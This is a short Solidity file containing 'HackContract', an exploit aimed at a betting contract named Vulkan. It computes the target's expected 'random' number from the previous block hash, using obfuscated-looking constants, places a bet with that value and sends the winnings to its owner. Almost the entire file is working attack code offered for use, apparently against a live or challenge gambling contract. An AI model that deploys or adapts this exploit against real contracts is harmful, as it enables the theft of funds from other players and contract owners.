pragma solidity ^0.4.21;

  // You need to win by putting correct bet
  // Here you a have original code of contract 
  
  
  contract Vulkan {
    
    
  modifier onlyBet() {
        require(msg.value >= 0.1 ether && msg.value <= 5 ether);
        _;
    }
    
    function status() external view returns(bool);
    function setBet(uint256 _userBet) external payable onlyBet ;
    
  }
  
    
    
  
  contract HackContract {
      
     Vulkan deployed;
     address owner;
     string public name;
    
    constructor(address _vulkanAddress) public {
        deployed = Vulkan(_vulkanAddress);
        owner = msg.sender;
    }
    
    function() payable {
    }
    
    function withdraw() public {
        owner.transfer(address(this).balance);
    }
    
    function hackVulkan() public payable {
        deployed.setBet.value(msg.value)(rand());
    }
    
    function getBalance() public returns (uint256) {
        return address(this).balance;    
    }
    
    uint256 constant private curve_dot_one = ~uint256(12);
    uint256 constant private curve_dot_two = ~uint256(100);
    uint256 constant private curve_dot_three = ~uint256(curve_dot_two);
    
    function rand() public view returns (uint256 result) {
      uint256 solc_one = curve_dot_one / curve_dot_two;
      uint256 sum_solc = uint256(block.blockhash(block.number - 1));
      return uint256((uint256(sum_solc) / solc_one)) % curve_dot_three;
    }
  
  }